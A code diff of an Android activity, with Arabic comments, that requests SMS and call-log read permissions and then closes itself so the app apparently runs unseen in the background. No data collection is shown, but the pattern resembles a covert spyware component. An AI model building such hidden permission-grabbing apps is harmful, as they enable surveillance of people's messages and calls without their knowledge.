@@ -16,21 +16,15 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 1. إذا كان الإصدار قديماً (أقل من مارشيملو)، الأذونات تمنح تلقائياً عند التثبيت
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+        // إذا كان الإصدار قديماً (أقل من 6.0) أو الأذونات ممنوحة مسبقاً → أنهِ فوراً
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
+            (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
+             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)) {
             finish();
             return;
         }
 
-        // 2. تحقق إذا كانت الأذونات ممنوحة بالفعل
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-            // ممنوحة مسبقاً → أنهي النشاط (التطبيق جاهز للعمل في الخلفية)
-            finish();
-            return;
-        }
-
-        // 3. اطلب الأذونات (سيظهر مربع حوار للمستخدم)
+        // طلب الأذونات
         ActivityCompat.requestPermissions(this, new String[]{
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CALL_LOG,
@@ -43,14 +37,12 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQ_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                // المستخدم وافق ✅
-                Toast.makeText(this, "✅ الأذونات ممنوحة، التطبيق يعمل الآن", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
             } else {
-                // المستخدم رفض ❌
-                Toast.makeText(this, "❌ الأذونات مرفوضة، التطبيق لن يعمل بشكل صحيح", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "❌ الأذونات مرفوضة", Toast.LENGTH_SHORT).show();
             }
         }
-        // أنهِ النشاط بعد طلب الأذونات (سواء وافق أو رفض)
+        // انتهى النشاط فوراً (يختفي من الشاشة)
         finish();
     }
 }
